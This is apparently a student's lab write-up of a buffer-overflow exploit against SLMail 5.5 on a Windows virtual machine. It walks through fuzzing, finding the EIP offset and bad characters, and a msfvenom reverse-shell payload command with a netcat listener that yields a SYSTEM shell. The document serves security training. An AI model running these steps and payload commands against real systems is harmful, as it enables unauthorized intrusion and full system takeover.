# Windows Buffer Overflow

## Objective:
This project is centered on understanding and executing a Windows buffer overflow. By targeting a specific Windows virtual machine, the project aimed to shed light on the intricacies of buffer overflow vulnerabilities in a Windows environment, emphasizing the steps and tools necessary to exploit such flaws. The key objectives of the project are detailed below:
- **Manual Buffer Overflow:** Engaging in a step-by-step process to perform a buffer overflow against a Windows target, understanding the specific conditions and elements that lead to successful exploitation.
- **Immunity Debugger Integration:** Leveraging the Immunity Debugger to trace and understand the buffer overflow process in real-time. This involved attaching specific processes to the debugger and observing program behavior during exploitation attempts.
- **Character Testing and EIP Control:** Using a fuzzer script to determine the exact point of EIP overwrite, followed by a systematic approach to identifying and removing bad characters to ensure the crafted payload's effectiveness.
- **Payload Crafting and Exploitation:** Utilizing MSFvenom to generate a specific payload, followed by setting breakpoints and adjusting scripts to gain control over the program's execution. Successfully exploiting the vulnerability led to obtaining a reverse shell on the target machine.

## Walkthrough:
- Opened BOF machine, accessed command prompt as admin, ran **“slmgr /rearm”** and **“ipconfig”**. Identified IP as **“10.0.2.10”**.

<p align="center">
  <img src="https://github.com/B-Johnson89/Cybersecurity-Projects/blob/main/Windows%20Buffer%20Overflow/Assets/BOF1.png" alt="">
</p>

- Installed **“12f1ab027e5374587e7e998c00682c5d-SLMail55_4433.exe”**, rebooted VM, and created a shortcut for **“SLmail.cpl”**.

<p align="center">
  <img src="https://github.com/B-Johnson89/Cybersecurity-Projects/blob/main/Windows%20Buffer%20Overflow/Assets/BOF2.png" alt="">
</p>

- Launched **“SLmail.cpl”** & **“Immunity debugger”** as admin.

<p align="center">
  <img src="https://github.com/B-Johnson89/Cybersecurity-Projects/blob/main/Windows%20Buffer%20Overflow/Assets/BOF3.png" alt="">
</p>

- In “Immunity debugger”, attached the **“SLmail.exe”** file and ensure its active state.

<p align="center">
  <img src="https://github.com/B-Johnson89/Cybersecurity-Projects/blob/main/Windows%20Buffer%20Overflow/Assets/BOF4-1.png" alt="">
</p>
<p align="center">
  <img src="https://github.com/B-Johnson89/Cybersecurity-Projects/blob/main/Windows%20Buffer%20Overflow/Assets/BOF4-2.png" alt="">
</p>

- On my Kali machine, downloaded the **“fuzzerScript.py”** to the BOF folder on the desktop.

<p align="center">
  <img src="https://github.com/B-Johnson89/Cybersecurity-Projects/blob/main/Windows%20Buffer%20Overflow/Assets/BOF5.png" alt="">
</p>

- In the same directory, created and edited **“fuzzy.py”**, updating the target IP address on line 13.

<p align="center">
  <img src="https://github.com/B-Johnson89/Cybersecurity-Projects/blob/main/Windows%20Buffer%20Overflow/Assets/BOF6.png" alt="">
</p>

- Performed an nmap scan on the target VM. Identified Port 100 open with “pop3” protocol.

<p align="center">
  <img src="https://github.com/B-Johnson89/Cybersecurity-Projects/blob/main/Windows%20Buffer%20Overflow/Assets/BOF7.png" alt="">
</p>

- Updated the **“fuzzy.py”** with the target IP and port.

<p align="center">
  <img src="https://github.com/B-Johnson89/Cybersecurity-Projects/blob/main/Windows%20Buffer%20Overflow/Assets/BOF8.png" alt="">
</p>

- In the BOF directory, executed the script using “python2 fuzzy.py”.

<p align="center">
  <img src="https://github.com/B-Johnson89/Cybersecurity-Projects/blob/main/Windows%20Buffer%20Overflow/Assets/BOF9.png" alt="">
</p>

- In Immunity debugger, noticed EIP showing **“41414141”**.

<p align="center">
  <img src="" alt="">
</p>

- Generated an MSF pattern using **“msf-pattern_create -l 3000”**, producing a unique 3000-byte pattern to identify program control flow.

<p align="center">
  <img src="" alt="">
</p>

- Copied this pattern into the **“fuzzy.py”** script buffer, removing the unnecessary counter and loop.

<p align="center">
  <img src="" alt="">
</p>

- Reset both SLmail.cpl and Immunity debugger. Ensured SLmail was active in Immunity, then ran **“python2 fuzzy.py”** from Kali.

<p align="center">
  <img src="" alt="">
</p>

- Observed EIP in Immunity debugger updated to **“39694438”**.

<p align="center">
  <img src="" alt="">
</p>

- Determined memory control location using **“msf-pattern_offset -l 3000 -q 39694438”**, identifying offset **“2606”**.

<p align="center">
  <img src="" alt="">
</p>

- Validated this by modifying **“fuzzy.py”** buffer to **“A * 2606 + B * 4”**.

<p align="center">
  <img src="" alt="">
</p>

- Reset SLmail.cpl and Immunity debugger, then executed **“python2 fuzzy.py”**. Noticed EIP as **“42424242”** and EBP as **“41414141”** in Immunity debugger.

<p align="center">
  <img src="" alt="">
</p>

- Updated **“fuzzy.py”** to include bad characters, and modified the buffer accordingly.

<p align="center">
  <img src="" alt="">
</p>

- Restarted slmail.clp and Immunity debugger. Ran **“python fuzzy.py”** from Kali, noting an output of 2865 bytes.

<p align="center">
  <img src="" alt="">
</p>

- Followed ESP in Immunity debugger's dump, identifying sequences to be removed from **“fuzzy.py”**.

<p align="center">
  <img src="" alt="">
</p>

- Repeated the process with updated **“fuzzy.py”**, observing a byte decrease in output.

<p align="center">
  <img src="" alt="">
</p>

- Made another update to **“fuzzy.py”**, removing the identified bad character.

<p align="center">
  <img src="" alt="">
</p>

- Reset tools, searched for mona modules in Immunity debugger, then searched for the appropriate DLL.

<p align="center">
  <img src="" alt="">
</p>

- Crafted shellcode with **“msfvenom -p windows/shell_reverse_tcp LPORT=4444 LHOST=10.0.2.6 -f c -b "\x00\x0a\x0d"”**.

<p align="center">
  <img src="" alt="">
</p>

- Updated “fuzzy.py” with the crafted shell code.

<p align="center">
  <img src="" alt="">
</p>

- Set up a listener on Kali with **“nc -lvp 4444”**.



- Restarted SLmail, ran **“fuzzy.py”**. The netcat listener received the code, granting system access. Confirmed with **“whoami”** command showing “nt authority\system”.
